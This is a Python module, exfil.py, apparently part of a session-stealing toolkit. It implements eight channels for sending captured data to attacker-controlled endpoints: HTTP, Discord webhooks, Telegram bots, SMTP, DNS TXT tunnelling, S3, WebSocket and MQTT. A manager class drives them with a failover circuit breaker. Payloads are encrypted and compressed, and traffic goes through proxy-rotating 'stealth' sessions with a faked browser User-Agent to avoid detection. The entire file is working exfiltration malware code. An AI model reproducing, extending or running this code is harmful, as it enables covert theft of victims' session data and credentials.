#!/usr/bin/env python3
# exfil.py - Exfiltration channels and manager
# Provides: HTTP, Discord, Telegram, SMTP, DNS, S3, WebSocket, MQTT exfiltration
# Updated with enhanced logger integration and additional features

import os
import json
import time
import base64
import hashlib
import gzip
from datetime import datetime, timezone
from typing import Dict, List, Optional
from urllib.parse import quote

import requests
from core import CryptoUtils, StealthEngine
from logger import get_logger

# Initialize logger for this module
logger = get_logger('exfil')

# -------------------- BASE CLASS --------------------
class ExfilChannel:
    """Base class for all exfiltration channels."""
    
    def __init__(self, config: dict):
        self.config = config
        self.name = self.__class__.__name__
        self.retry_count = 0
        self.last_error: Optional[str] = None
        # Provide a StealthEngine per channel so sessions use central proxy rotation
        try:
            self.stealth = StealthEngine()
        except Exception:
            self.stealth = None
        
    def exfil(self, payload: dict) -> bool:
        """Exfiltrate payload. Must be implemented by subclass."""
        raise NotImplementedError

    def validate(self) -> tuple[bool, Optional[str]]:
        """Validate channel configuration and connectivity."""
        return True, None
    
    def _compress_payload(self, payload: dict) -> bytes:
        """Compress payload using gzip for better efficiency."""
        plaintext = json.dumps(payload).encode('utf-8')
        compressed = gzip.compress(plaintext, compresslevel=6)
        logger.debug(f"Compressed {len(plaintext)} -> {len(compressed)} bytes ({100 - (len(compressed)*100/len(plaintext)):.1f}% reduction)")
        return compressed

    def _encrypt_payload(self, payload: dict, key: bytes = None, compress: bool = True) -> dict:
        """
        Encrypt payload using AES-256-GCM if encryption key is provided.
        
        Args:
            payload: Payload dict to encrypt
            key: Optional encryption key (bytes). If not provided, uses config's encryption_key.
            compress: Whether to compress before encryption
        
        Returns:
            Encrypted payload dict with 'ct', 'nonce', 'key_id', 'type', 'timestamp' fields,
            or original payload if no encryption key is available.
        """
        if key is None and 'encryption_key' in self.config:
            key = bytes.fromhex(self.config['encryption_key'])
        elif key is None:
            return payload
        
        # Optionally compress before encryption
        if compress and self.config.get('compress', True):
            plaintext = self._compress_payload(payload)
        else:
            plaintext = json.dumps(payload).encode('utf-8')
        
        nonce, ciphertext = CryptoUtils.aes_gcm_encrypt(key, plaintext)
        
        result = {
            'ct': CryptoUtils.b64_encode(ciphertext),
            'nonce': CryptoUtils.b64_encode(nonce),
            'key_id': hashlib.sha256(key).hexdigest()[:16],
            'type': 'aes256_gcm',
            'timestamp': datetime.now(timezone.utc).isoformat(),
        }
        
        if compress:
            result['compressed'] = 'gzip'
        
        return result

# -------------------- HTTP EXFIL (with chunking) --------------------
class HTTPExfil(ExfilChannel):
    """Exfiltrate via HTTP/HTTPS POST, PUT, or GET requests with chunking support."""
    
    def exfil(self, payload: dict) -> bool:
        url = self.config.get('url')
        if not url:
            logger.error(f"{self.name}: no URL configured")
            return False
        
        compress = self.config.get('compress', True)
        encrypted = self._encrypt_payload(payload, compress=compress)
        method = self.config.get('method', 'POST').upper()
        
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        if 'extra_headers' in self.config:
            headers.update(self.config['extra_headers'])
        
        max_chunk = self.config.get('chunk_size', 500 * 1024)  # 500KB default
        data_str = json.dumps(encrypted)
        
        # Add custom User-Agent if configured
        if 'user_agent' in self.config:
            headers['User-Agent'] = self.config['user_agent']

        def _send(data, index=0, total=1):
            try:
                logger.exfil(f"Sending chunk {index}/{total} to {url} ({len(data)} bytes)")
                
                sess = self.stealth.build_session() if self.stealth else requests.Session()
                if method == 'POST':
                    r = sess.post(url, data=data, headers=headers, timeout=30)
                elif method == 'PUT':
                    r = sess.put(url, data=data, headers=headers, timeout=30)
                else:  # GET
                    r = sess.get(f"{url}?d={quote(data)}", headers=headers, timeout=30)
                
                if r.status_code in (200, 201, 202, 204):
                    logger.exfil(f"Chunk {index}/{total} delivered successfully")
                    return True
                else:
                    logger.warning(f"HTTP {r.status_code} response for chunk {index}/{total}")
                    return False
                    
            except Exception as e:
                logger.error(f"HTTPExfil chunk {index}/{total} failed: {e}")
                return False

        if len(data_str) <= max_chunk:
            return _send(data_str)
        
        # Chunked exfiltration
        chunks = [data_str[i:i+max_chunk] for i in range(0, len(data_str), max_chunk)]
        logger.info(f"Splitting payload into {len(chunks)} chunks of ~{max_chunk} bytes")
        
        for idx, chunk in enumerate(chunks):
            if not _send(chunk, idx+1, len(chunks)):
                return False
            # Delay between chunks to avoid rate limiting
            time.sleep(self.config.get('inter_chunk_delay', 2))
        
        logger.success(f"HTTPExfil: delivered {len(chunks)} chunks to {url}")
        return True

# -------------------- DISCORD WEBHOOK --------------------
class DiscordWebhookExfil(ExfilChannel):
    """Exfiltrate via Discord webhook (message or file attachment)."""
    
    def exfil(self, payload: dict) -> bool:
        webhook_url = self.config.get('webhook_url')
        if not webhook_url:
            logger.error(f"{self.name}: no webhook URL configured")
            return False
        
        encrypted = self._encrypt_payload(payload, compress=True)
        data_str = json.dumps(encrypted, indent=2)
        
        # Use direct session if skip_proxy is set, otherwise use stealth engine
        if self.config.get('skip_proxy'):
            sess = requests.Session()
        else:
            sess = self.stealth.build_session() if self.stealth else requests.Session()
        
        try:
            # Try as message first (limited to 2000 chars)
            if len(data_str) < 1900:
                # Split into multiple messages if needed
                lines = data_str.split('\n')
                current_msg = ""
                messages = []
                
                for line in lines:
                    if len(current_msg) + len(line) + 1 < 1900:
                        current_msg += line + '\n'
                    else:
                        messages.append(current_msg)
                        current_msg = line + '\n'
                if current_msg:
                    messages.append(current_msg)
                
                for idx, msg in enumerate(messages):
                    r = sess.post(webhook_url, json={
                        'content': f"```json\n{msg[:1900]}\n```",
                        'username': self.config.get('bot_name', 'Session Capture')
                    }, timeout=15)
                    if r.status_code not in (200, 204):
                        logger.warning(f"Discord message {idx+1}/{len(messages)} failed: {r.status_code}")
                        return False
                    if len(messages) > 1:
                        time.sleep(1)
                
                logger.success(f"DiscordExfil: delivered {len(messages)} messages")
                return True
            
            # Fall back to file upload for large payloads
            files = {'file': (f"session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                             data_str, 'application/json')}
            r = sess.post(webhook_url, 
                            data={'username': self.config.get('bot_name', 'RedTeam')},
                            files=files, timeout=30)
            
            if r.status_code in (200, 204):
                logger.success("DiscordExfil: delivered as file attachment")
                return True
            else:
                logger.error(f"DiscordExfil file upload failed: HTTP {r.status_code}")
                return False
                
        except Exception as e:
            logger.error(f"DiscordExfil: {e}")
            return False

# -------------------- TELEGRAM BOT --------------------
class TelegramExfil(ExfilChannel):
    """Exfiltrate via Telegram bot (send as document)."""
    
    def exfil(self, payload: dict) -> bool:
        bot_token = self.config.get('bot_token')
        chat_id = self.config.get('chat_id')

        if isinstance(bot_token, str) and bot_token.startswith('${') and bot_token.endswith('}'):
            bot_token = os.environ.get(bot_token[2:-1])
        elif isinstance(bot_token, str) and bot_token.startswith('$'):
            bot_token = os.environ.get(bot_token[1:])

        if isinstance(chat_id, str) and chat_id.startswith('${') and chat_id.endswith('}'):
            chat_id = os.environ.get(chat_id[2:-1])
        elif isinstance(chat_id, str) and chat_id.startswith('$'):
            chat_id = os.environ.get(chat_id[1:])

        bot_token = bot_token or os.environ.get('TELEGRAM_BOT_TOKEN')
        chat_id = chat_id or os.environ.get('TELEGRAM_CHAT_ID')

        if not bot_token:
            logger.error(f"{self.name}: no bot token configured")
            return False
        if not chat_id:
            logger.error(f"{self.name}: no chat ID configured")
            return False
        
        encrypted = self._encrypt_payload(payload, compress=True)
        data_str = json.dumps(encrypted, indent=2)
        document_url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        message_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        
        self.last_error = None
        try:
            # Try to send as document
            files = {'document': (f'session_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json', 
                                  data_str.encode('utf-8'), 'application/json')}
            # Use direct session if skip_proxy is set, otherwise use stealth engine
            if self.config.get('skip_proxy'):
                sess = requests.Session()
            else:
                sess = self.stealth.build_session() if self.stealth else requests.Session()
            r = sess.post(document_url, data={'chat_id': chat_id}, files=files, timeout=30)
            
            if r.status_code == 200:
                self.last_error = None
                logger.success(f"TelegramExfil: delivered to chat {chat_id}")
                return True
            else:
                self.last_error = self._parse_telegram_error(r, 'sendDocument')
                logger.warning(f"TelegramExfil document send failed: {self.last_error}")
                # Try sending as text if document fails
                r2 = sess.post(message_url, data={
                    'chat_id': chat_id,
                    'text': f"```json\n{data_str[:4000]}\n```",
                    'parse_mode': 'Markdown'
                }, timeout=30)
                if r2.status_code == 200:
                    self.last_error = None
                    logger.success("TelegramExfil: delivered as text message")
                    return True
                else:
                    self.last_error = self._parse_telegram_error(r2, 'sendMessage')
                    logger.error(f"TelegramExfil failed: {self.last_error}")
                    return False
        except Exception as e:
            self.last_error = str(e)
            logger.error(f"TelegramExfil: {e}")
            return False

    def _parse_telegram_error(self, response, context: str) -> str:
        try:
            body = response.json()
            if isinstance(body, dict) and not body.get('ok', True):
                return f"{context} {response.status_code}: {body.get('description', response.text)}"
        except Exception:
            pass
        return f"{context} {response.status_code}: {response.text}"

    def validate(self) -> tuple[bool, Optional[str]]:
        bot_token = self.config.get('bot_token')
        chat_id = self.config.get('chat_id')

        if isinstance(bot_token, str) and bot_token.startswith('${') and bot_token.endswith('}'):
            bot_token = os.environ.get(bot_token[2:-1])
        elif isinstance(bot_token, str) and bot_token.startswith('$'):
            bot_token = os.environ.get(bot_token[1:])

        if isinstance(chat_id, str) and chat_id.startswith('${') and chat_id.endswith('}'):
            chat_id = os.environ.get(chat_id[2:-1])
        elif isinstance(chat_id, str) and chat_id.startswith('$'):
            chat_id = os.environ.get(chat_id[1:])

        bot_token = bot_token or os.environ.get('TELEGRAM_BOT_TOKEN')
        chat_id = chat_id or os.environ.get('TELEGRAM_CHAT_ID')

        if not bot_token:
            return False, 'Missing Telegram bot token'
        if not chat_id:
            return False, 'Missing Telegram chat ID'

        try:
            # Use direct session if skip_proxy is set, otherwise use stealth engine
            if self.config.get('skip_proxy'):
                sess = requests.Session()
            else:
                sess = self.stealth.build_session() if self.stealth else requests.Session()
            me_resp = sess.get(f"https://api.telegram.org/bot{bot_token}/getMe", timeout=15)
            if me_resp.status_code != 200:
                return False, self._parse_telegram_error(me_resp, 'getMe')

            chat_resp = sess.get(
                f"https://api.telegram.org/bot{bot_token}/getChat",
                params={'chat_id': chat_id},
                timeout=15
            )
            if chat_resp.status_code != 200:
                error_text = self._parse_telegram_error(chat_resp, 'getChat')
                if 'chat not found' in error_text.lower():
                    error_text += ' (verify TELEGRAM_CHAT_ID, ensure the bot is a member of the target chat or the user has started the bot, and use -100... for supergroups/channels when required)'
                return False, error_text

            return True, None
        except Exception as e:
            return False, str(e)

# -------------------- SMTP EMAIL --------------------
class SMTPExfil(ExfilChannel):
    """Exfiltrate via SMTP email with attachment."""
    
    def exfil(self, payload: dict) -> bool:
        import smtplib
        from email.mime.text import MIMEText
        from email.mime.multipart import MIMEMultipart
        from email.mime.base import MIMEBase
        from email import encoders
        
        smtp_host = self.config.get('smtp_host')
        smtp_port = self.config.get('smtp_port', 587)
        username = self.config.get('username')
        password = self.config.get('password')
        from_addr = self.config.get('from_addr')
        to_addr = self.config.get('to_addr')
        
        if not all([smtp_host, from_addr, to_addr]):
            logger.error(f"{self.name}: missing required configuration")
            return False
        
        encrypted = self._encrypt_payload(payload, compress=True)
        data_str = json.dumps(encrypted, indent=2)
        
        msg = MIMEMultipart()
        msg['From'] = from_addr
        msg['To'] = to_addr
        msg['Subject'] = self.config.get('subject', f'Report - {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
        
        # Create attachment
        attachment = MIMEBase('application', 'octet-stream')
        attachment.set_payload(data_str.encode('utf-8'))
        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', 'attachment',
                             filename=f"session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.enc")
        msg.attach(attachment)
        
        # Add plain text body
        body = f"Session captured at {datetime.now().isoformat()}\nSize: {len(data_str)} bytes"
        msg.attach(MIMEText(body, 'plain'))
        
        try:
            logger.exfil(f"Connecting to SMTP server {smtp_host}:{smtp_port}")
            server = smtplib.SMTP(smtp_host, smtp_port)
            server.starttls()
            
            if username and password:
                server.login(username, password)
                logger.debug("SMTP authentication successful")
            
            server.send_message(msg)
            server.quit()
            logger.success(f"SMTPExfil: sent to {to_addr}")
            return True
            
        except Exception as e:
            logger.error(f"SMTPExfil: {e}")
            return False

# -------------------- DNS (requires dnspython) --------------------
class DNSExfil(ExfilChannel):
    """Exfiltrate via DNS TXT queries (chunked, base64 encoded)."""
    
    def exfil(self, payload: dict) -> bool:
        domain = self.config.get('domain')
        if not domain:
            logger.error(f"{self.name}: no domain configured")
            return False
        
        try:
            import dns.resolver
            import dns.exception
        except ImportError:
            logger.error("DNSExfil: install dnspython (pip install dnspython)")
            return False
        
        encrypted = self._encrypt_payload(payload, compress=True)
        # Encode to base64 for DNS compatibility
        data_str = base64.urlsafe_b64encode(json.dumps(encrypted).encode()).decode('utf-8')
        chunk_size = self.config.get('chunk_size', 50)  # DNS TXT max is ~255 chars, 50 for data is safe
        chunks = [data_str[i:i+chunk_size] for i in range(0, len(data_str), chunk_size)]
        session_id = hashlib.md5(data_str.encode()).hexdigest()[:8]
        total = len(chunks)
        
        resolver = dns.resolver.Resolver()
        resolver.nameservers = self.config.get('nameservers', ['8.8.8.8', '1.1.1.1'])
        resolver.timeout = self.config.get('timeout', 3)
        resolver.lifetime = self.config.get('lifetime', 10)
        
        logger.info(f"DNSExfil: Sending {total} chunks via {domain}")
        success_count = 0
        
        for idx, chunk in enumerate(chunks):
            query = f"{idx:04x}.{total:04x}.{session_id}.{chunk}.{domain}"
            if len(query) > 253:
                logger.warning(f"Chunk {idx} too long ({len(query)} chars), skipping")
                continue
            
            try:
                resolver.resolve(query, 'TXT')
                success_count += 1
                if (idx + 1) % 10 == 0:
                    logger.debug(f"DNSExfil: {idx+1}/{total} chunks sent")
            except dns.exception.DNSException as e:
                logger.debug(f"DNS query {idx} failed: {e}")
            
            time.sleep(self.config.get('inter_chunk_delay', 0.2))
        
        logger.success(f"DNSExfil: {success_count}/{total} chunks sent via {domain}")
        return success_count > 0

# -------------------- S3 (requires boto3) --------------------
class S3Exfil(ExfilChannel):
    """Exfiltrate to AWS S3 or S3-compatible storage."""
    
    def exfil(self, payload: dict) -> bool:
        try:
            import boto3
            from botocore.config import Config
            from botocore.exceptions import ClientError
        except ImportError:
            logger.error("S3Exfil: install boto3 (pip install boto3)")
            return False
        
        endpoint_url = self.config.get('endpoint_url')
        access_key = self.config.get('access_key')
        secret_key = self.config.get('secret_key')
        bucket = self.config.get('bucket')
        
        if not all([endpoint_url, access_key, secret_key, bucket]):
            logger.error(f"{self.name}: missing required S3 configuration")
            return False
        
        encrypted = self._encrypt_payload(payload, compress=True)
        data = json.dumps(encrypted).encode('utf-8')
        
        # Generate key path with date-based organization
        date_path = datetime.now().strftime('%Y/%m/%d')
        timestamp = datetime.now().strftime('%H%M%S')
        key = f"sessions/{date_path}/{self.config.get('file_prefix', 'capture')}_{timestamp}_{os.urandom(4).hex()}.enc"
        
        try:
            session = boto3.Session(
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
            )
            s3 = session.client('s3', endpoint_url=endpoint_url,
                               region_name=self.config.get('region', 'us-east-1'),
                               config=Config(connect_timeout=15, read_timeout=30))
            
            # Upload with server-side encryption
            s3.put_object(
                Bucket=bucket, 
                Key=key,
                Body=data,
                ServerSideEncryption='AES256',
                Metadata={
                    'capture_time': datetime.now(timezone.utc).isoformat(),
                    'size': str(len(data))
                }
            )
            
            logger.success(f"S3Exfil: uploaded {len(data)} bytes to s3://{bucket}/{key}")
            return True
            
        except ClientError as e:
            logger.error(f"S3Exfil AWS error: {e}")
            return False
        except Exception as e:
            logger.error(f"S3Exfil: {e}")
            return False

# -------------------- WEBSOCKET --------------------
class WebSocketExfil(ExfilChannel):
    """Exfiltrate via WebSocket connection."""
    
    def exfil(self, payload: dict) -> bool:
        try:
            import websocket
        except ImportError:
            logger.error("WSExfil: install websocket-client (pip install websocket-client)")
            return False
        
        ws_url = self.config.get('ws_url')
        if not ws_url:
            logger.error(f"{self.name}: no WebSocket URL configured")
            return False
        
        encrypted = self._encrypt_payload(payload, compress=True)
        data = json.dumps(encrypted)
        
        try:
            logger.exfil(f"Connecting to WebSocket: {ws_url}")
            ws = websocket.create_connection(
                ws_url, 
                timeout=self.config.get('timeout', 15),
                header=['User-Agent: Mozilla/5.0']
            )
            
            # Send in chunks if needed
            max_chunk = 1024 * 1024  # 1MB
            if len(data) <= max_chunk:
                ws.send(data)
            else:
                chunks = [data[i:i+max_chunk] for i in range(0, len(data), max_chunk)]
                for idx, chunk in enumerate(chunks):
                    ws.send(chunk)
                    time.sleep(0.5)
                logger.debug(f"Sent {len(chunks)} chunks via WebSocket")
            
            ws.close()
            logger.success(f"WSExfil: sent to {ws_url}")
            return True
            
        except Exception as e:
            logger.error(f"WSExfil: {e}")
            return False

# -------------------- MQTT --------------------
class MQTTExfil(ExfilChannel):
    """Exfiltrate via MQTT protocol."""
    
    def exfil(self, payload: dict) -> bool:
        try:
            import paho.mqtt.client as mqtt
        except ImportError:
            logger.error("MQTTExfil: install paho-mqtt (pip install paho-mqtt)")
            return False
        
        broker = self.config.get('broker')
        port = self.config.get('port', 1883)
        topic = self.config.get('topic', 'devices/telemetry')
        username = self.config.get('username')
        password = self.config.get('password')
        
        if not broker:
            logger.error(f"{self.name}: no MQTT broker configured")
            return False
        
        encrypted = self._encrypt_payload(payload, compress=True)
        data = json.dumps(encrypted)
        
        try:
            client = mqtt.Client()
            client.enable_logger(logger) if self.config.get('debug', False) else None
            
            if username and password:
                client.username_pw_set(username, password)
            
            logger.exfil(f"Connecting to MQTT broker {broker}:{port}")
            client.connect(broker, port, keepalive=60)
            
            # Publish with QoS
            qos = self.config.get('qos', 1)
            client.publish(topic, data, qos=qos, retain=False)
            client.disconnect()
            
            logger.success(f"MQTTExfil: published to {broker}/{topic} ({len(data)} bytes)")
            return True
            
        except Exception as e:
            logger.error(f"MQTTExfil: {e}")
            return False

# -------------------- EXFIL MANAGER --------------------
class ExfilManager:
    """
    Manages multiple exfiltration channels with circuit breaker pattern.
    Loads channels from configuration and handles failures gracefully.
    """
    
    def __init__(self, config_data: dict, encryption_key: Optional[str] = None):
        """
        Initialize ExfilManager with channel configurations.
        
        Args:
            config_data: Configuration dict with 'channels' list and optional 'max_failures_per_channel'
            encryption_key: Global encryption key (hex string) for all channels
        """
        self.channels: List[ExfilChannel] = []
        self.failure_count: Dict[str, int] = {}
        self.success_count: Dict[str, int] = {}
        self.max_failures = config_data.get('max_failures_per_channel', 3)
        self.encryption_key = encryption_key
        self.parallel = config_data.get('parallel', False)
        
        # Channel registry
        CHANNEL_MAP = {
            'http': HTTPExfil,
            'discord': DiscordWebhookExfil,
            'telegram': TelegramExfil,
            'smtp': SMTPExfil,
            'dns': DNSExfil,
            's3': S3Exfil,
            'websocket': WebSocketExfil,
            'mqtt': MQTTExfil,
        }
        
        # Load channels from config
        for ch_cfg in config_data.get('channels', []):
            ctype = ch_cfg.get('type', '').lower()
            
            # 'all' type creates all available channels with same config
            if ctype == 'all':
                logger.info("Creating all available exfil channels")
                for cls in CHANNEL_MAP.values():
                    cfg_copy = ch_cfg.copy()
                    if 'encryption_key' not in cfg_copy and encryption_key:
                        cfg_copy['encryption_key'] = encryption_key
                    self.channels.append(cls(cfg_copy))
                continue
            
            if ctype in CHANNEL_MAP:
                if 'encryption_key' not in ch_cfg and encryption_key:
                    ch_cfg['encryption_key'] = encryption_key
                self.channels.append(CHANNEL_MAP[ctype](ch_cfg))
                logger.info(f"Loaded exfil channel: {ctype}")
            else:
                logger.warning(f"Unknown channel type: {ctype} - skipping")
        
        logger.success(f"Loaded {len(self.channels)} exfiltration channel(s)")
    
    def exfiltrate(self, payload: dict) -> Dict[str, dict]:
        """
        Send payload through all configured exfiltration channels.
        
        Args:
            payload: Payload dict to exfiltrate
        
        Returns:
            Dict mapping channel name to a result dict with success and error fields
        """
        results = {}
        
        if not self.channels:
            logger.warning("No exfil channels configured")
            return results
        
        logger.info(f"Starting exfiltration to {len(self.channels)} channel(s)")
        
        for channel in self.channels:
            cname = channel.__class__.__name__
            
            # Circuit breaker: skip channel if too many failures
            if self.failure_count.get(cname, 0) >= self.max_failures:
                logger.warning(f"Circuit breaker open for {cname} (max failures reached)")
                results[cname] = {'success': False, 'error': 'circuit breaker open'}
                continue
            
            try:
                logger.exfil(f"Attempting exfiltration via {cname}")
                start_time = time.time()
                success = channel.exfil(payload)
                elapsed = (time.time() - start_time) * 1000
                
                results[cname] = {
                    'success': success,
                    'error': channel.last_error
                }
                
                # Update statistics
                if success:
                    self.success_count[cname] = self.success_count.get(cname, 0) + 1
                    self.failure_count[cname] = 0
                    logger.exfil(f"{cname} succeeded in {elapsed:.0f}ms")
                else:
                    self.failure_count[cname] = self.failure_count.get(cname, 0) + 1
                    logger.warning(f"{cname} failed (failure count: {self.failure_count[cname]}/{self.max_failures})")
                    
            except Exception as e:
                logger.error(f"{cname} exception: {e}", exc_info=True)
                results[cname] = {'success': False, 'error': str(e)}
                self.failure_count[cname] = self.failure_count.get(cname, 0) + 1
        
        # Summary
        ok = sum(1 for v in results.values() if (v.get('success') if isinstance(v, dict) else bool(v)))
        total = len(results)
        logger.info(f"Exfiltration complete: {ok}/{total} channels successful")
        
        if ok < total:
            failed = [name for name, result in results.items() if not (result.get('success') if isinstance(result, dict) else bool(result))]
            logger.warning(f"Failed channels: {', '.join(failed)}")
        
        return results

    def validate(self) -> Dict[str, dict]:
        """Validate configured exfil channels."""
        results = {}
        for channel in self.channels:
            cname = channel.__class__.__name__
            try:
                valid, error = channel.validate()
                results[cname] = {
                    'valid': valid,
                    'error': error
                }
            except Exception as e:
                results[cname] = {
                    'valid': False,
                    'error': str(e)
                }
        return results
    
    def get_stats(self) -> Dict:
        """Get exfiltration statistics."""
        return {
            'total_channels': len(self.channels),
            'success_counts': self.success_count,
            'failure_counts': self.failure_count,
            'max_failures': self.max_failures,
        }

# -------------------- HELPER FUNCTIONS --------------------
def load_exfil_config(config_source: str, encryption_key: str = None) -> Optional[ExfilManager]:
    """
    Load exfiltration configuration from JSON string, file, or URL.
    
    Args:
        config_source: JSON string, file path, or URL
        encryption_key: Optional global encryption key
    
    Returns:
        ExfilManager instance or None if loading fails
    """
    try:
        if config_source.startswith('http://') or config_source.startswith('https://'):
            logger.exfil(f"Loading exfil config from URL: {config_source}")
            sess = StealthEngine().build_session()
            resp = sess.get(config_source, timeout=10)
            config_data = resp.json()
        elif os.path.exists(config_source):
            logger.exfil(f"Loading exfil config from file: {config_source}")
            with open(config_source, 'r') as f:
                config_data = json.load(f)
        else:
            logger.exfil("Loading exfil config from JSON string")
            config_data = json.loads(config_source)

        def _expand_env(item):
            if isinstance(item, str):
                return os.path.expandvars(item)
            if isinstance(item, dict):
                return {key: _expand_env(value) for key, value in item.items()}
            if isinstance(item, list):
                return [_expand_env(value) for value in item]
            return item

        config_data = _expand_env(config_data)
        return ExfilManager(config_data, encryption_key=encryption_key)
        
    except Exception as e:
        logger.error(f"Failed to load exfil configuration: {e}")
        return None